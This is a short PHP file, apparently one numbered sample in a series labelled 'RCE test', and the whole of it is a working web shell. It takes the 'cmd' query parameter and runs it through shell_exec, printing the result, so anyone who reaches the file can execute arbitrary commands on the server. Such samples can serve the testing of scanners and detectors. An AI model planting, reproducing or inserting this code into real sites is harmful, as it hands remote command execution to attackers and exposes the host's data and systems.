<?php
// RCE test variation #273
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>